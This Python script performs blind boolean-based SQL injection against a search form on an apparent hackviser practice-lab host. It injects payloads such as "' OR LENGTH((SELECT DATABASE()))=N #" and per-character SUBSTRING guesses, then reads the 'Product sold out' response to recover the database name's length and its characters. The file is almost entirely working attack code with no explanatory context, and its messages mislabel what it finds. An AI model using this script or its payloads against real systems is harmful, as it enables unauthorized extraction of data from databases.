import requests

url="https://living-butterfly.europe1.hackviser.space/"
headers={'User_Agent' : 'Mozilla/5.0'}
data={'search' : "' OR LENGTH((SELECT DATABASE()))=2 #"}
res=requests.post(url , headers=headers , data=data)
print(res.status_code)
print('Product sold out' in res.text)


def Long(url , headers , data):
	i=0
	ok=True
	while ok : 
		i+=1
		data["search"]="' OR LENGTH((SELECT DATABASE()))="+str(i)+"#"
		res=requests.post(url , headers=headers , data=data)
		print('[Looking for Length ...]  ' +str(i))
		if not('Product sold out' in res.text) :
			ok=False 
			print('[Length Found :)]   --> '+str(i))
	


def Brute(url , headers , data):
	c="abcdefghijklmnopqrstuvwxyz_"
	p=''
	for i in range(1,11):
		for j in range(len(c)):
			data["search"]="' OR SUBSTRING((SELECT DATABASE()),"+str(i)+",1)='"+c[j]+"' #"
			res=requests.post(url , headers=headers , data=data)
			print('[Looking for passowrd ...]  '+p+c[j])
			if not('Product sold out' in res.text) :
				p+=c[j]
				break
				
	print('[Length Found :)]   --> '+p)


#Long(url , headers , data)
Brute(url , headers , data)
			


